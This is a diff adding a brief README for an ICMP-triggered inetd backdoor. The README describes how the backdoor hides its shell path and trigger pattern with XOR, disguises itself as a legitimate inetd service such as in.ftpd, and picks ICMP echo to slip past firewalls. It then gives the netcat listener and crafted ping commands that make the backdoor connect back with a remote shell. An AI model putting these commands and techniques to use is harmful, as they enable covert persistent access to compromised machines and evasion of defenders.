@@ -1,0 +1,23 @@
+icmp based inetd backdoor
+=========================
+
++ store /bin/sh, pattern, fake procoess name xor'ed in binary
+  (default value 39)
++ destination address and port are variable
++ if no entry is in inetd.conf process will appear as fake
+  else as the first entry i.e. in.ftpd 
++ type ICMP_ECHO is standard, change it if you like
+  (ICMP_ECHO shouldnt be firewalled ;>)
++ define pattern ( key, pass ...) default pattern "deadaffe"
+
+
+server side:		  activation:
+nc -lp [port]             ping -c 1 -p [PATTERN][PORT] [server]
+
+for example:
+pattern = \x41\x41\x41\x41 (xor it with value 39 to write it to the binary...)
+
+nc -lp 57005 ( = 0xdead)  ping -c 1 -p 41414141dead localhost
+
+have fun,
+wildandi
